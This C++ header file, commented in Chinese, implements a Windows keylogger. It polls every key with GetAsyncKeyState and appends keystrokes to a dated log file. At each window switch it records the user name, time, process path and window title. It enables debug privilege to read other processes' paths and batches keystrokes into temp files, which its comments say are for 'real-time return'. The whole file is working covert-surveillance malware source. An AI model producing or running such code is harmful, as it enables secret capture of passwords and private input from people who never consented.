#pragma once
// GetAsyncKeyState 使用此函数获取
// Filename 全局保存键盘记录的的文件 默认位置为exe同目录下以日期命名的文件
#include <iostream>
#include <stdlib.h>
#include <atlstr.h>
#include <Windows.h>
#include <WinUser.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>
#include <fstream>
#include "common.h"
#include "file.h"

using namespace std;

#define MAXFILELENGTH    1024  //记录单个文件最大字符串长度 实时传输需要

#pragma comment(lib,"Kernel32.lib") 
string Filename = "C:\\log.txt";//记录文本exe同目录下,默认在C:\\log.txt目录下 

//当前目录下生成日志文件 workDir\date.txt
string generateLogFile(void)
{
	//获得当前登录用户名
	string userName = GetCurrentUser();
	cout << "current User:" << userName << endl;
	string path = GetCurrentWorkDir();
	cout << "current Path: " << path << endl;
	CString date = GetDate();
	cout << "current date: " << date << endl;
	Filename = GetCurrentWorkDir() + "\\" + string(GetDate()) + ".txt";
	cout << "logFileName: " << Filename << endl;
	return Filename;
}


// 判断键盘按下什么键
string GetKey(int Key)
{
	string KeyString = "";
	//判断符号输入
	const int KeyPressMask = 0x80000000; //键盘掩码常量
	int iShift = GetKeyState(0x10); //判断Shift键状态
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //表示按下Shift键
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}
	//判断键盘的第一行
	if (Key == VK_ESCAPE) // 退出
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1至F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // 打印屏幕
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL) // 滚动锁定
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE) // 暂停、中断
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL) // 大写锁定
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	//控制键
	else if (Key == 8) //<- 回格键
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN) // 回车键、换行
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // 空格
		KeyString = " ";
	//上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
	//上档键和别的键组合，输出时有字符输出
	/*
	else if (Key == VK_LSHIFT) // 左侧上档键
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT) // 右侧上档键
	KeyString = "[SHIFT]";
	*/
	/*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
	else if (Key == VK_TAB) // 制表键
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // 左控制键
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL) // 右控制键
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU) // 左换档键
		KeyString = "[Alt]";
	else if (Key == VK_LMENU) // 右换档键
		KeyString = "[ALT]";
	else if (Key == VK_LWIN) // 右 WINDOWS 键
		KeyString = "[Win]";
	else if (Key == VK_RWIN) // 右 WINDOWS 键
		KeyString = "[WIN]";
	else if (Key == VK_APPS) // 键盘上 右键
		KeyString = "右键";
	else if (Key == VK_INSERT) // 插入
		KeyString = "[Insert]";
	else if (Key == VK_DELETE) // 删除
		KeyString = "[Delete]";
	else if (Key == VK_HOME) // 起始
		KeyString = "[Home]";
	else if (Key == VK_END) // 结束
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // 上一页
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // 下一页
		KeyString = "[PgDown]";
	// 不常用的几个键:一般键盘没有
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //上、下、左、右键
		KeyString = "[←]";
	else if (Key == VK_RIGHT)
		KeyString = "[→]";
	else if (Key == VK_UP)
		KeyString = "[↑]";
	else if (Key == VK_DOWN)
		KeyString = "[↓]";
	else if (Key == VK_NUMLOCK)//小键盘数码锁定
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // 加、减、乘、除
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
		KeyString = ".";
	//小键盘数字键:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	//*对字母的大小写进行判断*//
	else if (Key >= 97 && Key <= 122) // 字母:a-z
	{
		if (GetKeyState(VK_CAPITAL)) // 大写锁定
		{
			if (IS) //Shift按下:为小写字母
				KeyString = Key;
			else // 只有大写锁定:输出大写字母
				KeyString = Key - 32;
		}
		else// 大写没有锁定
		{
			if (IS) // 按下Shift键: 大写字母
				KeyString = Key - 32;
			else // 没有按Shift键: 小写字母
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57) // 键盘数字:0-9及上方的符号
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90) //ASCII 65-90 为A-Z
		{
			if (GetKeyState(VK_CAPITAL)) // 大写锁定:输出A-Z
			{
				if (IS) // 大写锁定，并且按下上档键:输出为小写字母
					KeyString = Key + 32;
				else //只有大写锁定:输出为大写字母
					KeyString = Key;
			}
			else // 大写没有锁定:a-z
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}

	return KeyString;
}

//连接时间字符串
CString getfilename(WORD year, WORD month, WORD day, WORD hour, WORD minute, WORD second) {
	CString year1, month1, day1, hour1, minute1, second1;
	year1.Format("%d", year);
	month1.Format("%d", month);
	day1.Format("%d", day);
	hour1.Format("%d", hour);
	minute1.Format("%d", minute);
	second1.Format("%d", second);
	CString path1 = year1 + "." + month1 + "." + day1 + "_" + hour1 + "." + minute1 + "." + second1;
	return path1;
}


// 通过PID获取进程路径 无法获得系统的进程镜像路径
CString getProcPath(int PID)
{
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE hModule;
	PROCESSENTRY32* pinfo = new PROCESSENTRY32;
	MODULEENTRY32* minfo = new MODULEENTRY32;
	pinfo->dwSize = sizeof(PROCESSENTRY32);
	minfo->dwSize = sizeof(MODULEENTRY32);
	char shortpath[MAX_PATH] = "";
	hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);//pinfo->th32ProcessID);
	Module32First(hModule, minfo);



	CString str;
	str.Format("%s", minfo->szExePath);
	CloseHandle(hProcess);
	CloseHandle(hModule);
	if (pinfo) delete pinfo;
	if (minfo) delete minfo;
	return str;
}

//提升权限函数
BOOL EnablePrivilege(HANDLE hToken, LPCSTR szPrivName)
{

	TOKEN_PRIVILEGES tkp;

	LookupPrivilegeValue(NULL, szPrivName, &tkp.Privileges[0].Luid);//修改进程权限  
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL);//通知系统修改进程权限  

	return((GetLastError() == ERROR_SUCCESS));

}

//通过进程PID获取进程路径 无法获得系统的进程镜像路径
string GetProcessPathByPId(const DWORD dwProcessId)
{
	string KeyString = "";
	HANDLE hProcess = NULL;
	BOOL bSuccess = FALSE;
	HANDLE  hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	EnablePrivilege(hToken, SE_DEBUG_NAME);


	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
	do
	{
		if (NULL == hProcess)
		{
			break;
		}
		char szPath[MAX_PATH + 1] = { 0 };
		HMODULE hMod = NULL;
		DWORD cbNeeded = 0;
		if (FALSE == EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
		{
			break;
		}
		if (0 == GetModuleFileNameEx(hProcess, hMod, szPath, MAX_PATH))
		{
			break;
		}
		KeyString = szPath;
		bSuccess = TRUE;
	} while (0);
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}
	return KeyString;
}

//DosPath转NTPath
BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR            szDriveStr[500];
	TCHAR            szDrive[3];
	TCHAR            szDevName[100];
	INT                cchDevName;
	INT                i;

	//检查参数
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//获取本地磁盘字符串
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\")))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if (!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}
//获取进程完整路径  可行的方法
BOOL GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
	TCHAR        szImagePath[MAX_PATH];
	HANDLE        hProcess;
	if (!pszFullPath)
		return FALSE;

	pszFullPath[0] = '\0';
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPID);
	if (!hProcess)
		return FALSE;

	if (!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!DosPathToNtPath(szImagePath, pszFullPath))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);

	_tprintf(_T("%d,%s \r\n"), dwPID, pszFullPath);
	return TRUE;
}




// 键盘记录的主函数
void keylog_main()
{

	WORD year, month, day, hour, minute, second;
	char wnd_title[256]; //窗口标题
	HWND hwnd;
	HWND hwnd_new = GetForegroundWindow();
	SYSTEMTIME sys;//时间对象

	CString PrtScnPath;   //截图文件保存的位置
	CString PrtScnName;   //截图文件名称
	CString file_string;  //完整的截图名称.jpg格式



	//用户 时间 进程  标题信息 作为一行Title写入文件
	char writeStringTitle[1024] = { 0 };

	

	//实时回传将键盘记录达到一定长度后写入临时目录的临时文件中回传操作
	string realTimeString = "";
	while (1)
	{

		
		hwnd = hwnd_new;
		hwnd_new = GetForegroundWindow(); // get handle of currently active window 获取当前激活窗口的句柄
		GetWindowText(hwnd_new, wnd_title, sizeof(wnd_title));//最新窗口给 0
		//切换活动窗口时保存当前前置窗口的截图

		if (hwnd != hwnd_new && hwnd_new != NULL)
		{
			GetLocalTime(&sys);
			year = sys.wYear; month = sys.wMonth; day = sys.wDay; hour = sys.wHour; minute = sys.wMinute; second = sys.wSecond;
			//下面三行可以注释掉，节约资源
			cout << endl;
			cout << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			cout << wnd_title << " ";
			//得到进程路径fullProcessImageName
			unsigned long iPID = 0;
			GetWindowThreadProcessId(hwnd_new, &iPID);
			char fullProcessImageName[MAX_PATH] = {0};
			GetProcessFullPath(iPID, fullProcessImageName);
			sprintf(writeStringTitle,"\n%s%s%04d/%02d/%02d %02d:%02d:%02d%s%s%s%s\n", GetCurrentUser().c_str(), SPLITCHAR,year, month, day, hour, minute, second, SPLITCHAR, fullProcessImageName, SPLITCHAR, wnd_title);
			cout << "change Window  Current Window Title: " << fullProcessImageName << endl;
			
			
			//目前做的是只要切换窗口就做记录 
			Write(Filename, string(writeStringTitle));
			cout << "Write TO file " << writeStringTitle << endl;

			//{
			//	ofstream f1;
			//	f1.open(Filename, ios::app);
			//	f1 << writeStringTitle;
			//	realTimeString += writeStringTitle;
			//	f1.close();
			//}  ==>>   Write(string(Filename, writeStringTitle);


		}
		//键盘记录信息写入文件Filename
		

		
		Sleep(5); // 延时5ms
		//扫描键盘码  频繁读写.txt文件

		string TempString = "";
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)
			{
				cout << GetKey(i);
				TempString = TempString  +  GetKey(i);
			}
		}
		if (TempString.size() > 0)
		{
			
			fstream FStream;
			FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			realTimeString += TempString;
			FStream.write(TempString.c_str(), TempString.size());
			FStream.close();

		}
		else {
			
		}

		//单个文件满足长度要求时记录一次
		if (realTimeString.size() >= MAXFILELENGTH)
		{
			CString realTimeFileName;//
			realTimeFileName.Format("%s\\%s.txt", GetUserTmpPath().c_str(), getfilename(sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond));
			Write(string(realTimeFileName), realTimeString);
			cout << "realTimeFileName " << realTimeFileName << "realTimeString " << realTimeString << endl;
			realTimeString.clear();
		}
	}
}